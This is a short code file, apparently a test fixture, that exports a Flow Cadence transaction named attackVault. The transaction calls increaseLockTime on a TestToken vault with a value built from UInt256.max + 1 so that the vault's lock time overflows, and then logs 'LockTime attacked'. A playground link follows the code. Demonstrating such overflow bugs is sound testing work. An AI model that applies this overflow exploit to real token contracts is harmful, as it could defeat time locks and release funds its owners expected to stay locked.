export const attackVault = `
import TestToken from 0x03
import FungibleToken from 0x01

transaction() {

  prepare(acct: AuthAccount) {
    let signerVault = acct.borrow<&TestToken.Vault>(from: /storage/Vault)
                            ??panic("Vault not found.")

    signerVault.increaseLockTime(secondesToIncrease:  UInt256.max +1 - signerVault.lockTime )
  }

  execute {
    log("LockTime attacked")
  }
}
`
//https://play.flow.com/e9011cba-17ac-4d60-992a-f144468c5e62?type=script&id=9649172c-230e-4503-bc54-294ea919d243&storage=none